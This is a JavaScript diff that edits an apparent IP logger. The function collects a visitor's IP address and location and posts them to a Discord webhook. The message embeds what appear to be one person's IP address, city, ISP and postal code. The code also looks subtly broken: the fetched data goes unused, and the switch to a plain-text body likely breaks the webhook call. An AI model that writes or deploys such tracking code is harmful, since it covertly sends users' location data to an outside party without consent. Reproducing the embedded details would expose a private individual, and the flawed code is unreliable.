@@ -5,14 +5,14 @@ async function getIPAndLocationAndSendToDiscord() {
         const data = await response.json();
         
         // Construct the message as a single block wrapped in a code block
-        const message = "```\n" +
+        const message = "\n" +
                         "City: Whittier\n" +
                         "Region: California\n" +
                         "Country: US\n" +
                         "Internet Provider: AS20115 Charter Communications\n" +
                         "Postal Code: 90602\n" +
                         "IP Address: 137.25.65.161\n" +
-                        "```";
+                        "\n";
         
         // Send the message to Discord using a webhook
         await sendToDiscord(message);
@@ -29,9 +29,9 @@ async function sendToDiscord(message) {
     await fetch(webhookURL, {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': 'text/plain',
         },
-        body: JSON.stringify({ content: message }),
+        body: message,
     });
 }
 
